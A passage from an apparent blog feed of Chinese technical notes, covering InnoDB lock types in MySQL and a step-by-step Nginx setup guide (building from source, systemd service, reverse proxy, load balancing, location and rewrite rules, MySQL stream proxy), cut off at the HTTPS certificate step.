<h3 id="9-9-2-行锁"><a href="#9-9-2-行锁" class="headerlink" title="9.9.2 行锁"></a>9.9.2 行锁</h3><ul>
<li>行锁分析</li>
</ul>
<table>
<thead>
<tr>
<th>时间点</th>
<th>session1</th>
<th>session2</th>
</tr>
</thead>
<tbody><tr>
<td>关闭自动提交</td>
<td>set autocommit&#x3D;0，关闭自动提交</td>
<td>同session1</td>
</tr>
<tr>
<td>更新同一条记录</td>
<td>UPDATE t_xx SET age &#x3D; 10 WHERE id &#x3D; 1;</td>
<td>UPDATE t_xx SET age &#x3D; 20 WHERE id &#x3D; 1;会阻塞，等待session1提交事务</td>
</tr>
<tr>
<td>更新不同记录</td>
<td>UPDATE t_xx SET age &#x3D; 10 WHERE id &#x3D; 1;</td>
<td>UPDATE t_xx SET age &#x3D; 20 WHERE id &#x3D; 2;</td>
</tr>
<tr>
<td>查看记录</td>
<td>select * FROM t_xx;查看到的是自己更新后的记录（包括未commit的记录，而其它session看不到未提交的记录）</td>
<td>同session1</td>
</tr>
<tr>
<td>commit</td>
<td>提交事务后，其它已存在且未开启自动提交的session需要commit后才能看到最新数据</td>
<td>同session1</td>
</tr>
</tbody></table>
<p>注意：InnoDB的行锁针对索引加的锁，不是针对记录加锁，没有索引或者索引失效都会导致行锁升级为表锁。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何锁定某一行：</span><br><span class="line">i.给特定行的条件加索引</span><br><span class="line">ii.select xxx for update;</span><br><span class="line">iii.处理完这条数据后，commit</span><br></pre></td></tr></table></figure>

<ul>
<li>结果分析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show status like &#x27;innodb_row_lock%&#x27;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>表头</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Innodb_row_lock_current_waits</td>
<td>当前正在等待的锁定数量</td>
</tr>
<tr>
<td>Innodb_row_lock_time</td>
<td>从系统启动到现在锁定总时长</td>
</tr>
<tr>
<td>Innodb_row_lock_time_avg</td>
<td>每次锁定等待平均时长</td>
</tr>
<tr>
<td>Innodb_row_lock_time_max</td>
<td>系统启动到现在最长的锁定等待时长</td>
</tr>
<tr>
<td>Innodb_row_lock_waits</td>
<td>锁定总次数</td>
</tr>
</tbody></table>
<p>总结：InnoDB存储引擎由于实现了行锁，虽然锁定机制的实现方面带来性能损耗可能比表锁要高一些，但是整体并发处理能力远远优于MyISAM的表锁。当系统并发量高时，InnoDB整体的性能优势会比较明显；但是如果使用不当，没有索引或者索引失效导致行锁升级表锁，整体性能可能比MyISAM更差。</p>
<p>建议：</p>
<p>​		①尽可能所有数据检索都用索引来完成，避免无索引或者索引失效升级为表锁；</p>
<p>​		②合理设计索引，尽量缩小锁的范围；</p>
<p>​		③尽可能少检索条件避免间隙锁；</p>
<p>​		④尽量控制事务大小，减少锁定资源数量和时间长度；</p>
<p>​		⑤尽可能低级别事务隔离。</p>
<h3 id="9-9-3-页锁"><a href="#9-9-3-页锁" class="headerlink" title="9.9.3 页锁"></a>9.9.3 页锁</h3><p>介于表锁和行锁的效率之间</p>
<p>表锁行锁页锁对比：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>开销</th>
<th>加锁速度</th>
<th>是否会发生死锁</th>
<th>锁定粒度</th>
<th>锁冲突概率</th>
<th>并发度</th>
</tr>
</thead>
<tbody><tr>
<td>行级锁</td>
<td>大</td>
<td>慢</td>
<td>会</td>
<td>最小</td>
<td>最低</td>
<td>最高</td>
</tr>
<tr>
<td>表级锁</td>
<td>小</td>
<td>快</td>
<td>不会</td>
<td>最大</td>
<td>最高</td>
<td>最低</td>
</tr>
<tr>
<td>页级锁</td>
<td>适中</td>
<td>适中</td>
<td>会</td>
<td>适中</td>
<td>适中</td>
<td>适中</td>
</tr>
</tbody></table>
<h3 id="9-9-4-记录锁"><a href="#9-9-4-记录锁" class="headerlink" title="9.9.4 记录锁"></a>9.9.4 记录锁</h3><p>记录锁是锁住记录，锁住索引记录，而不是真正的数据记录</p>
<ul>
<li>锁是非主键索引，会在索引记录上加锁后，在去主键索引上加锁</li>
<li>表上没有索引，会在隐藏的主键索引上加锁</li>
<li>如果要锁的列没有索引，进行全表记录加锁</li>
</ul>
<h3 id="9-9-5-间隙锁"><a href="#9-9-5-间隙锁" class="headerlink" title="9.9.5 间隙锁"></a>9.9.5 间隙锁</h3><p>当使用范围查询，并请求共享锁或者排它锁时，InnoDB会给符合条件的已有记录的索引项加锁，对于符合条件但不存在的记录，称为“间隙”（GAP）,InnoDB会对此间隙进行加锁，称之为间隙锁。这也是防止幻读的关键（RR隔离，Innodb默认隔离）</p>
<h3 id="9-9-6-临键锁"><a href="#9-9-6-临键锁" class="headerlink" title="9.9.6 临键锁"></a>9.9.6 临键锁</h3><p>记录锁加间隙锁，在RR隔离级别下，对行的扫描、锁定都是使用这种锁。如果查询中包含唯一索引，就会只适用记录锁。因为唯一索引能确定记录行数，其他索引不能确定行数，有可能在其他事务中添加这个索引的数据导致幻读。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx基础使用</title>
    <url>/2020/08/28/Nginx%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h1><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装pcre-8.44</span><br><span class="line">tar -zxvf pcre-8.44.tar.gz</span><br><span class="line">cd pcre-8.44</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">pcre-config --version</span><br><span class="line"></span><br><span class="line"># 安装其它依赖</span><br><span class="line">yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel</span><br><span class="line"></span><br><span class="line"># 安装nginx-1.20.1</span><br><span class="line">tar -zxvf nginx-1.20.1.tar.gz</span><br><span class="line">cd nginx-1.20.1</span><br><span class="line">./configure --with-http_ssl_module</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"># 把NGINX_HOME加入到环境变量，在/etc/profile最下面添加</span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;&gt;/etc/profile</span><br><span class="line"></span><br><span class="line">export NGINX_HOME=/usr/local/nginx</span><br><span class="line">export PATH=$PATH:$NGINX_HOME/sbin</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 并重新加载/etc/profile文件</span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line"># 查看版本</span><br><span class="line">nginx -V</span><br></pre></td></tr></table></figure>

<h2 id="1-2-加入系统服务（自启动）"><a href="#1-2-加入系统服务（自启动）" class="headerlink" title="1.2 加入系统服务（自启动）"></a>1.2 加入系统服务（自启动）</h2><ul>
<li>配置nginx.service</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;&gt;/lib/systemd/system/nginx.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=nginx - high performance web server</span><br><span class="line">Documentation=http://nginx.org/en/docs/</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line">  </span><br><span class="line">[Service] </span><br><span class="line">Type=forking</span><br><span class="line"># 路径对应安装路径</span><br><span class="line">Type=forking</span><br><span class="line">ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">ExecReload=/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">ExecStop=/usr/local/nginx/sbin/nginx -s stop</span><br><span class="line">PrivateTmp=true</span><br><span class="line"> </span><br><span class="line">[Install] </span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ul>
<li>给nginx.service配置755权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 755 /lib/systemd/system/nginx.service</span><br></pre></td></tr></table></figure>

<ul>
<li>加入开机自启动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure>

<ul>
<li>相关命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动nginx</span><br><span class="line">systemctl start nginx.service</span><br><span class="line"></span><br><span class="line"># 停止nginx</span><br><span class="line">systemctl stop nginx.service</span><br><span class="line"></span><br><span class="line"># 重启nginx</span><br><span class="line">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>

<h2 id="1-3-把具体服务器的配置分离"><a href="#1-3-把具体服务器的配置分离" class="headerlink" title="1.3 把具体服务器的配置分离"></a>1.3 把具体服务器的配置分离</h2><ul>
<li>执行以下指令创建默认配置default.conf，后续添加配置只需要在conf.d目录下添加对应的xxx.conf文件即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/local/nginx/conf/conf.d &amp;&amp; cat &lt;&lt;&#x27;EOF&#x27;&gt;/usr/local/nginx/conf/conf.d/default.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">    # concurs with nginx&#x27;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">#</span><br><span class="line">#server &#123;</span><br><span class="line">#    listen       8000;</span><br><span class="line">#    listen       somename:8080;</span><br><span class="line">#    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">#    location / &#123;</span><br><span class="line">#        root   html;</span><br><span class="line">#        index  index.html index.htm;</span><br><span class="line">#    &#125;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line"># HTTPS server</span><br><span class="line">#</span><br><span class="line">#server &#123;</span><br><span class="line">#    listen       443 ssl;</span><br><span class="line">#    server_name  localhost;</span><br><span class="line"></span><br><span class="line">#    ssl_certificate      cert.pem;</span><br><span class="line">#    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">#    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">#    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">#    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">#    location / &#123;</span><br><span class="line">#        root   html;</span><br><span class="line">#        index  index.html index.htm;</span><br><span class="line">#    &#125;</span><br><span class="line">#&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ul>
<li>执行以下指令修改nginx.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h2 id="1-4-常用命令"><a href="#1-4-常用命令" class="headerlink" title="1.4 常用命令"></a>1.4 常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 帮助命令</span><br><span class="line">[root@localhost ~]# nginx -h</span><br><span class="line">nginx version: nginx/1.20.0</span><br><span class="line">Usage: nginx [-?hvVtTq] [-s signal] [-p prefix]</span><br><span class="line">             [-e filename] [-c filename] [-g directives]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -?,-h         : this help</span><br><span class="line">  -v            : show version and exit</span><br><span class="line">  -V            : show version and configure options then exit</span><br><span class="line">  -t            : test configuration and exit</span><br><span class="line">  -T            : test configuration, dump it and exit</span><br><span class="line">  -q            : suppress non-error messages during configuration testing</span><br><span class="line">  -s signal     : send signal to a master process: stop, quit, reopen, reload</span><br><span class="line">  -p prefix     : set prefix path (default: /usr/local/nginx/)</span><br><span class="line">  -e filename   : set error log file (default: logs/error.log)</span><br><span class="line">  -c filename   : set configuration file (default: conf/nginx.conf)</span><br><span class="line">  -g directives : set global directives out of configuration file</span><br><span class="line"></span><br><span class="line"># 查看版本</span><br><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line"># 启动</span><br><span class="line">nginx [-c &lt;nginx.conf位置&gt;]</span><br><span class="line"></span><br><span class="line"># 测试配置是否正确</span><br><span class="line">nginx -t [-c &lt;nginx.conf位置&gt;]</span><br><span class="line"></span><br><span class="line"># 重新加载配置</span><br><span class="line">nginx -s reload [-c &lt;nginx.conf位置&gt;]</span><br><span class="line"></span><br><span class="line"># 平滑停止</span><br><span class="line">nginx -s quit</span><br><span class="line"></span><br><span class="line"># 强制停止</span><br><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>

<h1 id="2-原理"><a href="#2-原理" class="headerlink" title="2. 原理"></a>2. 原理</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）master-worker机制：一个nginx有1个master进程和多个worker进程组成，master接收到请求后，通知各个worker进程去争夺请求资源，再通过反向代理或者直接访问获取静态资源。</span><br><span class="line"></span><br><span class="line">（2）这样设计的好处：</span><br><span class="line">a.每个worker独立占用一个进程，reload的时候，正在处理请求的worker会在处理完当前请求之后再重新加载配置文件，其它空闲的worker会立马重新加载配置文件，保证了不停机。</span><br><span class="line">b.IO多路复用，把worker_processes数设计为cpu核心数可充分利用cpu资源</span><br><span class="line"></span><br><span class="line">（3）nginx优点：</span><br><span class="line">a.IO多路复用</span><br><span class="line">b.轻量</span><br><span class="line">c.cpu亲和</span><br><span class="line">d.采用sendfile模式，处理静态文件只需要经过内核空间，而不需要进过用户空间</span><br><span class="line"></span><br><span class="line">（4）问题：</span><br><span class="line">a.发送一个请求，占用worker几个连接数？</span><br><span class="line">2或者4，访问磁盘上的静态资源则为2，反向代理则为4</span><br><span class="line">b.一个nginx支持的最大并发数？</span><br><span class="line">访问静态资源：worker_connections*worker_processes / 2</span><br><span class="line">反向代理：worker_connections*worker_processes / 4</span><br></pre></td></tr></table></figure>

<h1 id="3-主要用途"><a href="#3-主要用途" class="headerlink" title="3. 主要用途"></a>3. 主要用途</h1><h2 id="3-1-反向代理"><a href="#3-1-反向代理" class="headerlink" title="3.1 反向代理"></a>3.1 反向代理</h2><p> 在conf.d下创建后缀为.conf的配置文件，内容如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  192.168.199.140;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line">    </span><br><span class="line">       #location / &#123;</span><br><span class="line">       #    proxy_pass http://www.baidu.com;</span><br><span class="line">       #&#125;</span><br><span class="line"></span><br><span class="line">       # 包含/aaa/时匹配：curl http://192.168.199.140:80/aaa/index.html会被转发到http://192.168.199.140:8091/aaa/index.html</span><br><span class="line">       location ~ /aaa/ &#123;</span><br><span class="line">           proxy_pass http://192.168.199.140:8091;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location ~ /bbb/ &#123;</span><br><span class="line">           proxy_pass http://192.168.199.140:8092;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>值得注意的是：proxy_pass最后以&#x2F;结尾，转发的时候不会带上location的字符串，例如：</p>
<p>访问<a href="http://192.168.199.140/aaa/user/getById/2">http://192.168.199.140:80/aaa/user/getById/2</a> 被转发到 <a href="http://192.168.199.140:8091/user/getById/2">http://192.168.199.140:8091/user/getById/2</a> </p>
<p>应用场景：前后端分离的项目，&#x2F;api开头的，转发到后端服务器地址，反之转发到前端代码地址</p>
</li>
</ul>
<h2 id="3-2-负载均衡"><a href="#3-2-负载均衡" class="headerlink" title="3.2 负载均衡"></a>3.2 负载均衡</h2><h3 id="3-2-1-基本配置"><a href="#3-2-1-基本配置" class="headerlink" title="3.2.1 基本配置"></a>3.2.1 基本配置</h3><p> 在conf.d下创建后缀为.conf的配置文件，内容如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  192.168.199.140;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line">    </span><br><span class="line">       location / &#123;</span><br><span class="line">           proxy_pass http://tomcat;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">       server 192.168.199.140:8091;</span><br><span class="line">       server 192.168.199.140:8092;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-2-负载均衡策略"><a href="#3-2-2-负载均衡策略" class="headerlink" title="3.2.2 负载均衡策略"></a>3.2.2 负载均衡策略</h3><table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>fail_timeout</td>
<td>失败超时，与max_fails结合使用。</td>
</tr>
<tr>
<td>max_fails</td>
<td>在fail_timeout参数时间内最大失败次数。如果在这个时间内，所有针对该服务器的请求都失败了，那么认为该服务器会被认为是停机了。</td>
</tr>
<tr>
<td>fail_time</td>
<td>服务器会被认为停机的时间长度，默认为10s。</td>
</tr>
<tr>
<td>backup</td>
<td>标记该服务器为备用服务器。当主服务器停止时，请求会被发送到它这里。</td>
</tr>
<tr>
<td>down</td>
<td>标记服务器永久停机了。</td>
</tr>
</tbody></table>
<p>六种负载均衡策略：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1.轮询，默认</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091;</span><br><span class="line">    server 192.168.199.140:8092;</span><br><span class="line">    server 192.168.199.140:8093 backup;		#作为备用节点使用，其它节点均不能使用的时候会使用此节点</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 2.加权轮询：指定weight，权重越大，分发请求比例越大，例如：</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091 weight=5;</span><br><span class="line">    server 192.168.199.140:8092 weight=10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 3.ip_hash：根据ip计算哈希值，同一个ip的请求只会落到同一个节点，无法处理同一个ip大量并发请求的情况</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091;</span><br><span class="line">    server 192.168.199.140:8092;</span><br><span class="line">    ip_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 4.least_conn：把请求转发给连接数较少的后端服务器</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091;</span><br><span class="line">    server 192.168.199.140:8092;</span><br><span class="line">    least_conn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 5.fair（第三方）：根据服务器响应时间来分配，响应时间短的优先分配</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091;</span><br><span class="line">    server 192.168.199.140:8092;</span><br><span class="line">    fair;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 6.url_hash（第三方）：实现每个url定向到同一个后端服务器</span><br><span class="line">upstream tomcat &#123;</span><br><span class="line">    server 192.168.199.140:8091;</span><br><span class="line">    server 192.168.199.140:8092;</span><br><span class="line">    hash $request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="3-3-动静分离"><a href="#3-3-动静分离" class="headerlink" title="3.3 动静分离"></a>3.3 动静分离</h2><p> 这里以配置静态资源为例。假设&#x2F;opt&#x2F;nginx&#x2F;static下有一文件aaa.html，且nginx配置为：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  192.168.199.140;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    #防止页面中文乱码</span><br><span class="line">    charset utf-8;</span><br><span class="line"></span><br><span class="line">    location /static/ &#123;</span><br><span class="line">        root /opt/nginx/;</span><br><span class="line">        #alias /opt/nginx/static/;</span><br><span class="line">        index aaa.html;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    location /txt/ &#123;</span><br><span class="line">        root /opt/nginx/;</span><br><span class="line">        autoindex on;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> （1）可通过浏览器访问：<a href="http://192.168.199.140/static/aaa.html">http://192.168.199.140/static/aaa.html</a> 或 <a href="http://192.168.199.140/static/%E8%AE%BF%E9%97%AE%E5%88%B0%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90aaa.html">http://192.168.199.140/static/访问到静态资源aaa.html</a></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root：表示静态资源在【root指定的目录下】的【location指定的路径下】，root最后的/可省略</span><br><span class="line"></span><br><span class="line">alias：表示静态资源在【alias指定的目录下】，这里需要配置为/opt/nginx/static/，且/不可省略，如果location不是以/结尾，则可以省略</span><br><span class="line"></span><br><span class="line">index：表示缺省时（这里为http://192.168.199.140/static/），默认访问指定目录下的哪个资源，这里取到的资源为aaa.html</span><br></pre></td></tr></table></figure>

<p> （2）可通过浏览器访问：<a href="http://192.168.199.140/txt/">http://192.168.199.140/txt/</a> 查看 &#x2F;opt&#x2F;nginx&#x2F;txt&#x2F;文件夹下的文件，autoindex为on表示可以列出整个目录下的内容</p>
<h1 id="4-location用法"><a href="#4-location用法" class="headerlink" title="4. location用法"></a>4. location用法</h1> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法：</span><br><span class="line">location [=|^~|~|~*|空白] &lt;uri&gt; &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###############################测试配置###################################</span><br><span class="line">	# 添加响应头，测试使用，也可以在location下添加</span><br><span class="line">       add_header Content-Type application/json;</span><br><span class="line"># 1. = 精确匹配</span><br><span class="line">location = / &#123;</span><br><span class="line">       return 200 &#x27;精确匹配&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 2. ^~ 以指定字符串开头，不是以指定正则开头</span><br><span class="line">location ^~ /static/ &#123;</span><br><span class="line">       return 200 &#x27;以指定字符串开头&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 3. ~ 匹配正则表达式</span><br><span class="line">location ~ \.(jpg|png|jpeg|gif|css|js)$ &#123;</span><br><span class="line">       return 200 &#x27;匹配正则表达式&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 4. ~* 匹配正则表达式（不区分大小写）</span><br><span class="line">location ~* \.(jpg|png|jpeg|gif|css|js)$ &#123;</span><br><span class="line">       return 200 &#x27;匹配正则表达式（不区分大小写）&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 5. !~ 不匹配正则表达式</span><br><span class="line">#location !~ /abc/ &#123;</span><br><span class="line">#    return 200 &#x27;不匹配正则表达式&#x27;;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line"># 6. !~* 不匹配正则表达式（不区分大小写）</span><br><span class="line">#location !~* /abc/ &#123;</span><br><span class="line">#    return 200 &#x27;不匹配正则表达式（不区分大小写）&#x27;;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line"># 7. 空白表示通用匹配</span><br><span class="line">location / &#123;</span><br><span class="line">       return 200 &#x27;通用匹配&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 分别在浏览器测试一下url</span><br><span class="line">https://192.168.199.140:80/</span><br><span class="line">https://192.168.199.140:80/static/</span><br><span class="line">https://192.168.199.140:80/static/aaa.JPG</span><br><span class="line">https://192.168.199.140:80/aaa.jpg</span><br><span class="line">https://192.168.199.140:80/aaa.JPG</span><br><span class="line"></span><br><span class="line">结论：匹配优先级由高到低，分别是：=、^~、~、~*、空白，与location的先后顺序无关。若要用匹配正则，需要用~或者~*</span><br></pre></td></tr></table></figure>

<h1 id="5-rewrite规则"><a href="#5-rewrite规则" class="headerlink" title="5. rewrite规则"></a>5. rewrite规则</h1> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可选值：</span><br><span class="line">last – 本条规则匹配完成后，继续向下匹配新的location URI规则</span><br><span class="line">break – 本条规则匹配完成即终止，不再匹配后面的任何规则</span><br><span class="line">redirect – 返回临时重定向的HTTP状态302</span><br><span class="line">permanent – 返回永久重定向的HTTP状态301</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">last和break区别：</span><br><span class="line">last会重新发一起请求来请求对应替换成的uri，而break不会，</span><br><span class="line">- break是终止当前location的rewrite检测,而且不再进行location匹配 </span><br><span class="line">- last是终止当前location的rewrite检测,但会继续重试location匹配并处理区块中的rewrite规则</span><br><span class="line"></span><br><span class="line">redirect与permanent区别，若第一次访问测试重定向后，关闭nginx：</span><br><span class="line">- redirect仍然会通过nginx去请求原地址（结果报错）</span><br><span class="line">- permanent在客户端保留了重定向后的地址（能正常访问）</span><br></pre></td></tr></table></figure>

<h1 id="6-nginx代理mysql"><a href="#6-nginx代理mysql" class="headerlink" title="6. nginx代理mysql"></a>6. nginx代理mysql</h1><p>nginx在安装的时候，需要加上一个参数：–with-stream，然后在nginx.conf里面与http同级的最下面添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">    upstream mysqlserver &#123;</span><br><span class="line">        hash $remote_addr consistent;</span><br><span class="line">        # $binary_remote_addr;</span><br><span class="line">        server 10.34.10.126:3306 weight=5 max_fails=3 fail_timeout=30s;    #真正mysql的位置</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 3306;	#数据库服务器监听端口</span><br><span class="line">        proxy_connect_timeout 10s;</span><br><span class="line">        proxy_timeout 300s;		#设置客户端和代理服务之间的超时时间，如果5分钟内没操作将自动断开。</span><br><span class="line">        proxy_pass mysqlserver;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-配置https"><a href="#7-配置https" class="headerlink" title="7. 配置https"></a>7. 配置https</h1><ol>
<li>创建证书目录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/local/nginx/conf/ssl/</span><br><span class="line">cd /usr/local/nginx/conf/ssl/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成证书</li>
</ol>
